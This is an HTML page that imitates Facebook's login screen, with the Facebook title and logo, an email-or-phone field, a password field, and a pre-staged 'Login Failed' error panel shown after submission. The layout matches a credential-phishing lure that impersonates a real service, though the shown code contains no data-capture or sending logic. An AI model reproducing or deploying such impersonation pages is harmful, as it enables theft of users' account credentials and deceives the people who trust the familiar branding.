<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Facebook – log in or sign up</title>
    <link rel="icon" type="image/x-icon" href="assets/img/favicon.ico">

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet"
        integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="assets/css/style.css">
</head>

<body class="modal-open body_color">
    <div class="container d-flex justify-content-center align-items-center hv-100">

        <div class="box">
            <div class="text-center">
                <img src="assets/img/facebook_logo.png" alt="facebook_logo" width="250px">
            </div>

            <div class="mb-3">
                <input type="email" class="form-control form-control-lg" placeholder="Email address or phone number">
            </div>
            <div class="mb-3">
                <input type="email" class="form-control form-control-lg" placeholder="Password">
            </div>
            <button type="submit" class="btn btn-lg btn-primary w-100">Submit</button>

        </div>



    </div>

    <div class="login_div bg-light d-flex justify-content-center align-items-center">
        <div class="container">
            <h3>Login Failed</h3>
            <p>Sorry, an unexpected error occurred. Please try again later.</p>
            <div class="text-end">
                <button class="btn btn-primary btn-facebook px-4" type="button">OK</button>
            </div>
        </div>
    </div>

    <div class="other_link text-light d-flex justify-content-center align-items-center">
        <div class="container text-center">
            <h6 class="mb-3">Sing Up for Facebook</h6>
            <h6 class="text-secondary">Forgot Password | Help Center</h6>           
        </div>
    </div>



    <div class="modal-backdrop fade show"></div>


    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"
        integrity="sha384-C6RzsynM9kWDrMNeT87bh95OGNyZPhcTNXj1NW7RuBCsyN/o0jlpcV8Qyq46cDfL" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js"
        integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous">
    </script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.min.js"
        integrity="sha384-BBtl+eGJRgqQAUMxJ7pMwbEyER4l1g+O15P+16Ep7Q9Q+zqX6gSbd85u4mG4QzX+" crossorigin="anonymous">
    </script>
</body>

</html>